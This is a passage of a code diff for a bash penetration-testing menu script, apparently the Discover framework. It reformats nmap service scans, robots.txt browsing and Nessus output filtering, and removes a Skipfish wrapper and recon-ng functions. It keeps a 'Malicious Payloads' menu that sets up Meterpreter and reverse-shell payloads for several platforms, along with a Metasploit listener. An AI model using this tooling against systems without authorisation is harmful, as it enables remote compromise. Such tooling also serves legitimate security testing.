-	nmap -iL $name/50000.txt -Pn -n --open -p50000 --script=drda-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-50000.txt
+     echo "     DRDA"
+     nmap -iL $name/50000.txt -Pn -n --open -p50000 --script=drda-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-50000.txt
 fi
 
 if [[ -e $name/hadoop.txt ]]; then
-	echo "     Hadoop"
-	nmap -iL $name/hadoop.txt -Pn -n --open -p50030,50060,50070,50075,50090 --script=hadoop-datanode-info,hadoop-jobtracker-info,hadoop-namenode-info,hadoop-secondary-namenode-info,hadoop-tasktracker-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-hadoop.txt
+     echo "     Hadoop"
+     nmap -iL $name/hadoop.txt -Pn -n --open -p50030,50060,50070,50075,50090 --script=hadoop-datanode-info,hadoop-jobtracker-info,hadoop-namenode-info,hadoop-secondary-namenode-info,hadoop-tasktracker-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-hadoop.txt
 fi
 
 if [[ -e $name/apache-hbase.txt ]]; then
-	echo "     Apache HBase"
-	nmap -iL $name/apache-hbase.txt -Pn -n --open -p60010,60030 --script=hbase-master-info,hbase-region-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-apache-hbase.txt
+     echo "     Apache HBase"
+     nmap -iL $name/apache-hbase.txt -Pn -n --open -p60010,60030 --script=hbase-master-info,hbase-region-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-apache-hbase.txt
 fi
 
 rm tmp*
@@ -2918,8 +3065,8 @@ if [ $hosts -eq 1 ]; then
      END=0
 
      echo
-	echo $medium
-	echo
+     echo $medium
+     echo
      echo "***Scan complete.***"
      echo
      echo
@@ -3050,7 +3197,7 @@ case $choice in
      echo -n "Use SSL? (y/N) "
      read ssl
 
-	 $web &
+     $web &
      sleep 2
 
      if [ -z $ssl ]; then
@@ -3082,8 +3229,8 @@ case $choice in
           f_error
      fi
 
-	 # Check for OS X
-	 if [[ `uname` == 'Darwin' ]]; then
+     # Check for OS X
+     if [[ `uname` == 'Darwin' ]]; then
           /usr/local/bin/wget -q $domain/robots.txt
      else
           wget -q $domain/robots.txt
@@ -3091,28 +3238,28 @@ case $choice in
 
      # Check if the file is empty
      if [ ! -s robots.txt ]; then
-		 echo
-		 echo -e "\x1B[1;31m$medium\x1B[0m"
-		 echo
-		 echo -e "\x1B[1;31m                          *** No robots file discovered. ***\x1B[0m"
-		 echo
-		 echo -e "\x1B[1;31m$medium\x1B[0m"
-		 sleep 2
-		 f_main
-	 fi
-	 
+          echo
+          echo -e "\x1B[1;31m$medium\x1B[0m"
+          echo
+          echo -e "\x1B[1;31m                          *** No robots file discovered. ***\x1B[0m"
+          echo
+          echo -e "\x1B[1;31m$medium\x1B[0m"
+          sleep 2
+          f_main
+     fi
+
      grep 'Disallow' robots.txt | awk '{print $2}' > tmp
 
-	 $web &
+     $web &
      sleep 2
-	 
+
      for i in $(cat tmp); do
           $web http://$domain$i &
           sleep 1
      done
 
      rm robots.txt
-	 mv tmp $home/data/$domain-robots.txt
+     mv tmp $home/data/$domain-robots.txt
 
      echo
      echo $medium
@@ -3214,120 +3361,6 @@ exit
 
 ##############################################################################################################
 
-f_skipfish() 
-{
-    f_runlocally
-    clear
-    f_banner
-
-    #
-    # This scripts is a Skipfish-wrapper that eases preliminary setup and 
-    # quick&dirty sweep on selected web application.
-    #
-    # Integrated from Mariusz B. (mgeeky at github) private repos.
-    #
-
-    SKIPFISH_DICTS_PATH=/usr/share/skipfish/dictionaries
-    SKIPFISH_SIGS_PATH=/usr/share/skipfish/signatures
-    DEFAULT_OUTPUT_PATH=$home/data/
-
-    echo
-    echo "Welcome to Skipfish launcher."
-    echo
-    read -p "[?] Enter URL: "
-    URL=$REPLY
-    read -p "Set scan intensity [1-3]: "
-    INTENSITY=$REPLY
-    read -p "Additional args: "
-    REST=$REPLY
-
-    urlparse() 
-    {
-        REPL="\2"
-        if [[ -n "$2" ]]; then
-            REPL=$2
-        fi
-
-        echo $1 | perl -pe "s/^(?:([^\:]*)\:\/\/)?(?:(?:[^\:\@]*)(?:\:(?:[^\@]*))?\@)?((?:(?:[^\/\:]*)\.(?:[^\.\/\:]*\.[^\.\/\:]*))?(?:[^\.\/\:]*)(?:\.(?:[^\/\.\:]*))?(?:\:(?:[0-9]*))?)(\/[^\?#]*(?=.*?\/)\/)?(?:[^\?#]*)?(?:\?(?:[^#]*))?(?:#(?:.*))?$/${REPL}/g"
-        
-    }
-
-    HOST=$(urlparse $URL)
-    TOP_SCOPE=$(urlparse $URL "\1:\/\/\2")/
-
-    if [[ $TOP_SCOPE != http* ]]; then
-        TOP_SCOPE=http$TOP_SCOPE
-    fi
-
-    OUTPUT_DIR=${DEFAULT_OUTPUT_PATH}${HOST/:/_}
-
-    case "$INTENSITY" in
-        2)  
-            SCAN_MODE="-MQ -S ${SKIPFISH_DICTS_PATH}/medium.wl -W ${DEFAULT_OUTPUT_PATH}learned_dict.wl -Y"
-            ;;
-
-        3)  
-            SCAN_MODE="-M -S ${SKIPFISH_DICTS_PATH}/complete.wl -W ${DEFAULT_OUTPUT_PATH}learned_dict.wl"
-            ;;
-
-        *)  SCAN_MODE="-Q -e -p 75 -W- -L"
-            ;;
-    esac
-
-    echo
-    if [[ -d $OUTPUT_DIR ]]; then
-        echo
-        echo "Currently existing directory: '$OUTPUT_DIR'"
-        read -p "Output directory already exists. Would you like to Rename it or Delete or quit? [R/d/q]: " -n 1 -r
-        if [[ $REPLY =~ ^[Rr]$ ]]; then
-            echo
-            read -p "Enter new output directory name: "
-            #mv $OUTPUT_DIR ${DEFAULT_OUTPUT_PATH}/$REPLY
-            OUTPUT_DIR=${DEFAULT_OUTPUT_PATH}/$REPLY
-        elif [[ $REPLY =~ ^[Dd]$ ]]; then
-            rm -rf $OUTPUT_DIR
-        else
-            echo
-            exit 1
-        fi
-    fi
-
-    echo
-    echo "Scope to be scanned: ${TOP_SCOPE}"
-    echo "Output directory: ${OUTPUT_DIR}"
-    echo "Intensity: $INTENSITY"
-    echo "Rest of params: $REST"
-    echo -e "COMMAND:\n"
-    echo /usr/bin/skipfish -EU -b f -o $OUTPUT_DIR $SCAN_MODE $REST -I ${TOP_SCOPE} $TOP_SCOPE
-    echo
-    read -p "Are the above options correct? [Y/n]: " -n 1 -r
-
-    if [[ $REPLY =~ ^[Yy]$ ]]; then
-        echo
-        echo "Engaging scanner..."
-        #mkdir -p $OUTPUT_DIR
-
-        if [[ $INTENSITY -gt 1 ]]; then
-            touch $DEFAULT_OUTPUT_PATH/learned_dict.wl
-        fi
-
-        xdotool key ctrl+shift+t
-        xdotool type "/usr/bin/skipfish -MEU -b f -o $OUTPUT_DIR $SCAN_MODE $REST -I ${TOP_SCOPE} $TOP_SCOPE"
-        sleep 1
-        xdotool key Return
-
-        echo "Done."
-    else
-        echo "Quitting."
-    fi
-
-    echo
-    exit
-}
-
-
-##############################################################################################################
-
 f_parse(){
 clear
 f_banner
@@ -3371,9 +3404,9 @@ case $choice in
      egrep -v "(Acronis Agent Detection \(TCP\)|Acronis Agent Detection \(UDP\)|Additional DNS Hostnames|Adobe AIR Detection|Adobe Reader Enabled in Browser \(Internet Explorer\)|Adobe Reader Enabled in Browser \(Mozilla firefox\)|Alert Standard Format \/ Remote Management and Control Protocol Detection|Amazon Web Services Settings|Apache Banner Linux Distribution Disclosure|Apache Tomcat Default Error Page Version Detection|Authentication Failure - Local Checks Not Run|CA ARCServe UniversalAgent Detection|CA BrightStor ARCserve Backup Discovery Service Detection|Cache' SuperServer Detection|Citrix Licensing Service Detection|Citrix Server Detection|COM+ Internet Services \(CIS\) Server Detection|Crystal Reports Central Management Server Detection|Data Execution Prevention \(DEP\) is Disabled|Daytime Service Detection|DB2 Connection Port Detection|Discard Service Detection|DNS Server BIND version Directive Remote Version Disclosure|DNS Server Detection|DNS Server hostname.bind Map Hostname Disclosure|Do not scan Novell NetWare|Do not scan printers|Do not scan printers \(AppSocket\)|Dropbox Installed \(Mac OS X\)|Dropbox Software Detection \(uncredentialed check\)|Enumerate IPv4 Interfaces via SSH|Echo Service Detection|EMC Replication Manager Client Detection|Enumerate IPv6 Interfaces via SSH|Enumerate MAC Addresses via SSH|Exclude top-level domain wildcard hosts|H323 Protocol \/ VoIP Application Detection|HP LoadRunner Agent Service Detection|HP Integrated Lights-Out \(iLO\) Detection|IBM Tivoli Storage Manager Client Acceptor Daemon Detection|IBM WebSphere MQ Listener Detection|ICMP Timestamp Request Remote Date Disclosure|Identd Service Detection|Ingres Communications Server Detection|Internet Cache Protocol \(ICP\) Version 2 Detection|IPSEC Internet Key Exchange \(IKE\) Detection|IPSEC Internet Key Exchange \(IKE\) Version 1 Detection|iTunes Music Sharing Enabled|iTunes Version Detection \(Mac OS X\)|JavaScript Enabled in Adobe Reader|IPSEC Internet Key Exchange \(IKE\) Version 2 Detection|iSCSI Target Detection|LANDesk Ping Discovery Service Detection|Link-Local Multicast Name Resolution \(LLMNR\) Detection|LPD Detection|mDNS Detection \(Local Network\)|Microsoft IIS 404 Response Service Pack Signature|Microsoft SharePoint Server Detection|Microsoft SQL Server Detection \(credentialed check\)|Microsoft SQL Server TCP\/IP Listener Detection|Microsoft SQL Server UDP Query Remote Version Disclosure|Microsoft Windows Installed Software Enumeration \(credentialed check\)|Microsoft Windows Messenger Detection|Microsoft Windows Mounted Devices|Microsoft Windows Security Center Settings|Microsoft Windows SMB Fully Accessible Registry Detection|Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration|Microsoft Windows SMB Registry Not Fully Accessible Detection|Microsoft Windows SMB Share Hosting Possibly Copyrighted Material|Microsoft Windows SMB : WSUS Client Configured|Microsoft Windows Startup Software Enumeration|Microsoft Windows Summary of Missing Patches|NIS Server Detection|Nessus SYN scanner|Nessus TCP scanner|Nessus UDP scanner|Nessus Windows Scan Not Performed with Admin Privileges|Netscape Enterprise Server Default Files Present|NetVault Process Manager Service Detection|NFS Server Superfluous|News Server \(NNTP\) Information Disclosure|NNTP Authentication Methods|OEJP Daemon Detection|Open Port Re-check|OpenVAS Manager \/ Administrator Detection|Oracle Database Detection|Oracle Database tnslsnr Service Remote Version Disclosure|Oracle Java JRE Enabled \(Google Chrome\)|Oracle Java JRE Enabled \(Internet Explorer\)|Oracle Java JRE Enabled \(Mozilla firefox\)|Oracle Java JRE Premier Support and Extended Support Version Detection|Oracle Java JRE Universally Enabled|Panda AdminSecure Communications Agent Detection|Patch Report|PCI DSS compliance : Insecure Communication Has Been Detected|Pervasive PSQL \/ Btrieve Server Detection|OSSIM Server Detection|POP Server Detection|PostgreSQL Server Detection|PPTP Detection|QuickTime for Windows Detection|Quote of the Day \(QOTD\) Service Detection|Reverse NAT\/Intercepting Proxy Detection|RMI Remote Object Detection|RPC rstatd Service Detection|rsync Service Detection|RTMP Server Detection|RTSP Server Type \/ Version Detection|Session Initiation Protocol Detection|SFTP Supported|Skype Detection|Skype for Mac Installed \(credentialed check\)|Skype Stack Version Detection|SLP Server Detection \(TCP\)|SLP Server Detection \(UDP\)|SMTP Authentication Methods|SMTP Server Detection|SNMP Protocol Version Detection|SNMP Query Installed Software Disclosure|SNMP Query Routing Information Disclosure|SNMP Query Running Process List Disclosure|SNMP Query System Information Disclosure|SNMP Request Network Interfaces Enumeration|Software Enumeration \(SSH\)|SSL Certificate Chain Contains Certificates Expiring Soon|SSL Certificate Chain Contains RSA Keys Less Than 2048 bits|SSL Certificate Chain Contains Unnecessary Certificates|SSL Certificate Chain Not Sorted|SSL Certificate commonName Mismatch|SSL Certificate Expiry - Future Expiry|Symantec pcAnywhere Detection \(TCP\)|Symantec pcAnywhere Status Service Detection \(UDP\)|TCP Channel Detection|Telnet Server Detection|TFTP Daemon Detection|Universal Plug and Play \(UPnP\) Protocol Detection|Unix Operating System on Extended Support|USB Drives Enumeration \(WMI\)|VMware Fusion Version Detection \(Mac OS X\)|WebDAV Detection|Web Server \/ Application favicon.ico Vendor Fingerprinting|Web Server Crafted Request Vendor/Version Information Disclosure|Web Server on Extended Support|Web Server SSL Port HTTP Traffic Detection|Web Server Unconfigured - Default Install Page Present|Web Server UPnP Detection|Windows Terminal Services Enabled|WINS Server Detection|X Font Service Detection)" tmp.csv > tmp2.csv
 
      # Delete additional findings.
-	 egrep -v '(DHCP Server Detection|mDNS Detection \(Remote Network\))' tmp2.csv > tmp3.csv
+     egrep -v '(DHCP Server Detection|mDNS Detection \(Remote Network\))' tmp2.csv > tmp3.csv
 
-cat tmp3.csv | sed 's/httpOnly/HttpOnly/g; s/Service Pack /SP/g; s/ (banner check)//; s/ (credentialed check)//; s/ (intrusive check)//g; s/ (remote check)//; s/ (safe check)//; s/ (uncredentialed check)//g; s/ (version check)//g; s/()//g; s/(un)//g' > $home/data/nessus-`date +%H:%M:%S`.csv
+     cat tmp3.csv | sed 's/httpOnly/HttpOnly/g; s/Service Pack /SP/g; s/ (banner check)//; s/ (credentialed check)//; s/ (intrusive check)//g; s/ (remote check)//; s/ (safe check)//; s/ (uncredentialed check)//g; s/ (version check)//g; s/()//g; s/(un)//g' > $home/data/nessus-`date +%H:%M:%S`.csv
 
      rm nessus* tmp*
 
@@ -3653,13 +3686,13 @@ if [ "$extquery" == "y" ]; then
      if ps ax | grep -v 'grep' | grep $processname > /dev/null; then
           echo
      else
-         $web &
-	     sleep 4
+          $web &
+	  sleep 4
      fi
 
      while read -r line; do
-		 $web "https://www.sslshopper.com/ssl-checker.html#hostname=$line" &
-	     sleep 1
+          $web "https://www.sslshopper.com/ssl-checker.html#hostname=$line" &
+	  sleep 1
      done < "$location"
 
      echo
@@ -3672,13 +3705,12 @@ else
 fi
 }
 
-
 ##############################################################################################################
 
 f_payload(){
 clear
 f_banner
-echo -e "\x1B[1;34mMALICIOUS PAYLOADS\x1B[0m"
+echo -e "\x1B[1;34mMalicious Payloads\x1B[0m"
 echo
 echo "1.  android/meterpreter/reverse_tcp"
 echo "2.  cmd/windows/reverse_powershell"
@@ -3694,40 +3726,40 @@ read choice
 
 case $choice in
      1) payload="android/meterpreter/reverse_tcp"
-	   extention=".apk"
-        format="raw"
-        arch="dalvik"
-	   platform="android";;
+          extention=".apk"
+          format="raw"
+          arch="dalvik"
+	  platform="android";;
      2) payload="cmd/windows/reverse_powershell"
-        extention=".bat"
-        format="raw"
-        arch="cmd"
-	   platform="windows";;
+          extention=".bat"
+          format="raw"
+          arch="cmd"
+	  platform="windows";;
      3) payload="linux/x64/shell_reverse_tcp"
-        extention=""
-        format="elf"
-        arch="x86_64"
-	   platform="linux";;
+          extention=""
+          format="elf"
+          arch="x86_64"
+          platform="linux";;
      4) payload="linux/x86/meterpreter/reverse_tcp"
-        extention=""
-        format="elf"
-        arch="x86"
-	   platform="linux";;
+          extention=""
+          format="elf"
+          arch="x86"
+          platform="linux";;
      5) payload="osx/x64/shell_reverse_tcp"
-	   extention=""
-	   format="macho"
-        arch="x86_64"
-	   platform="osx";;
+	  extention=""
+	  format="macho"
+          arch="x86_64"
+          platform="osx";;
      6) payload="windows/meterpreter/reverse_tcp"
-	   extention=".exe"
-	   format="exe"
-        arch="x86"
-	   platform="windows";;
+          extention=".exe"
+          format="exe"
+          arch="x86"
+          platform="windows";;
      7) payload="windows/x64/meterpreter/reverse_tcp"
-	   extention=".exe"
-	   format="exe"
-        arch="x86_64"
-	   platform="windows";;
+          extention=".exe"
+          format="exe"
+          arch="x86_64"
+          platform="windows";;
      8) f_main;;
      *) f_error;;
 esac
@@ -3748,7 +3780,7 @@ read lport
 
 # Check for valid port number.
 if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
-	f_error
+     f_error
 fi
 
 echo
@@ -3764,7 +3796,7 @@ exit
 f_listener(){
 clear
 f_banner
-echo -e "\x1B[1;34mMetasploit LISTENERS\x1B[0m"
+echo -e "\x1B[1;34mMetasploit Listeners\x1B[0m"
 echo
 echo "1.  android/meterpreter/reverse_tcp"
 echo "2.  cmd/windows/reverse_powershell"
@@ -3807,14 +3839,14 @@ echo
 
 # Check for valid port number.
 if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
-	f_error
+     f_error
 fi
 
 # Check for root when binding to a low port
 if [[ $lport -lt 1025 && "$(id -u)" != "0" ]]; then
      echo "You must be root to bind to a port that low."
      sleep 3
-	f_error
+     f_error
 fi
 
 cp $discover/resource/listener.rc /tmp/
@@ -3892,15 +3924,9 @@ echo >> tmp-updates
 echo "recon-ng" >> tmp-updates
 echo "==============================" >> tmp-updates
 python /usr/share/recon-ng/recon-cli -M > tmp
-egrep -v '(---|adobe|bozocrack|brute_suffix|census_2012|command_injector|dev_diver|Discovery|exit|Exploitation|geocode|hashes_org|Import|import|jigsaw|leakdb|mangle|namechk|pushpins|pwnedlist|Recon|Reporting|reporting|reverse_resolve|show modules|shodan_net|Spooling|twitter|xpath_bruter)' tmp > tmp2
-
-# Remove blank lines
-sed '/^$/d' tmp2 > tmp3
-# Remove leading whitespace from each line
-sed 's/^[ \t]*//' tmp3 > tmp4
-
-cat $discover/resource/recon-ng/active.rc $discover/resource/recon-ng/passive.rc | grep 'use' | sed 's/use //g' | sort > tmp5
-diff tmp4 tmp5 | egrep '^[<>]' | awk '{print $2}' | egrep -v '(ip_neighbor|pwnedlist)' >> tmp-updates
+grep '/' tmp | awk '{print $1}' | egrep -iv '(adobe|brute_suffix|cache_snoop|dev_diver|exploitation|freegeoip|google_site_web|import|ipinfodb|jigsaw|linkedin_auth|locations|mailtester|mangle|migrate_contacts|migrate_hosts|metacrawler|namechk|ports|profiler|pwnedlist|reporting|reverse_resolve|ssl_san|ssltools|twitter|vpnhunter|vulnerabilities)' > tmp2
+cat $discover/resource/recon-ng.rc $discover/resource/recon-ng-active.rc | grep 'use' | grep -v 'query' | awk '{print $2}' | sort -u > tmp3
+diff tmp2 tmp3 | grep '/' | awk '{print $2}' | sort -u >> tmp-updates
 
 echo >> tmp-updates
 echo >> tmp-updates
@@ -3912,76 +3938,6 @@ echo
 echo $medium
 echo
 printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/updates.txt
-echo
-echo
-exit
-}
-
-##############################################################################################################
-
-f_recon-ng(){
-clear
-f_banner
-
-echo "For best results, you should acquire keys to the following APIs and add them to recon-ng."
-echo "See: https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide"
-echo
-echo
-echo "Usage"
-echo
-echo "Company: Target"
-echo "Domain:  target.com"
-echo
-echo $medium
-echo
-echo -n "Company: "
-read company
-
-# Check for no answer
-if [[ -z $company ]]; then
-     f_error
-fi
-
-echo -n "Domain:  "
-read domain
-
-# Check for no answer
-if [[ -z $domain ]]; then
-     f_error
-fi
-
-cp $discover/resource/recon-ng/passive.rc /tmp/
-sed -i "s/xxx/$company/g" /tmp/passive.rc
-sed -i "s/yyy/$domain/g" /tmp/passive.rc
-
-recon-ng -r /tmp/passive.rc
-}
-
-##############################################################################################################
-
-f_parse_recon_ng(){
-clear
-f_banner
-
-python /usr/share/recon-ng/recon-cli -C "workspaces list"
-echo
-echo
-echo -n "Workspace:  "
-read workspace
-
-# Check for no answer
-if [[ -z $workspace ]]; then
-     f_error
-fi
-
-recon-ng -w $workspace -r $discover/resource/recon-ng/export.rc
-egrep -v '(\+|contacts|Output|output|returned|show|Spooling|spool|title)' tmp | cut -d '|' -f3,5-7 | sed 's/BuiltWith contact//g; s/Employee//g; s/PGP key association//g; s/Whois contact//g' > zcontacts
-egrep -v '(\+|contacts|Output|output|returned|show|Spooling|spool|title)' tmp2 | cut -d '|' -f3-7 > zcreds
-egrep -v '(\+|contacts|Output|output|returned|show|Spooling|spool|title)' tmp3 | cut -d '|' -f3-6 > zhosts
-egrep -v '(\+|contacts|Output|output|returned|show|Spooling|spool|title)' tmp4 > zleaks
-egrep -v '(\+|contacts|Output|output|returned|show|Spooling|spool|title)' tmp5 | cut -d '|' -f3-6 > zports
-egrep -v '(\+|contacts|example|Output|output|returned|show|Spooling|spool|title)' tmp6 | cut -d '|' -f5 > zvulns
-rm tmp*
 echo
 echo
 exit
@@ -4012,15 +3968,14 @@ echo -e "\x1B[1;34mWEB\x1B[0m"
 echo "8.  Open multiple tabs in $browser"
 echo "9.  Nikto"
 echo "10. SSL"
-echo "11. Skipfish"
 echo
 echo -e "\x1B[1;34mMISC\x1B[0m"
-echo "12. Crack WiFi"
-echo "13. Parse XML"
-echo "14. Generate a malicious payload"
-echo "15. Start a Metasploit listener"
-echo "16. Update"
-echo "17. Exit"
+echo "11. Crack WiFi"
+echo "12. Parse XML"
+echo "13. Generate a malicious payload"
+echo "14. Start a Metasploit listener"
+echo "15. Update"
+echo "16. Exit"
 echo
 echo -n "Choice: "
 read choice
@@ -4036,15 +3991,12 @@ case $choice in
      8) f_multitabs;;
      9) f_errorOSX; f_nikto;;
      10) f_errorOSX; f_ssl;;
-     11) f_errorOSX; f_skipfish;;
-     12) f_runlocally && $discover/crack-wifi.sh;;
-     13) f_parse;;
-	14) f_payload;;
-	15) f_listener;;
-     16) f_errorOSX; $discover/update.sh && exit;;
-     17) clear && exit;;
-     97) f_errorOSX; f_parse_recon_ng;;
-     98) f_errorOSX; f_recon-ng;;
+     11) f_runlocally && $discover/crack-wifi.sh;;
+     12) f_parse;;
+     13) f_payload;;
+     14) f_listener;;
+     15) f_errorOSX; $discover/update.sh && exit;;
+     16) clear && exit;;
      99) f_errorOSX; f_updates;;
      *) f_error;;
 esac
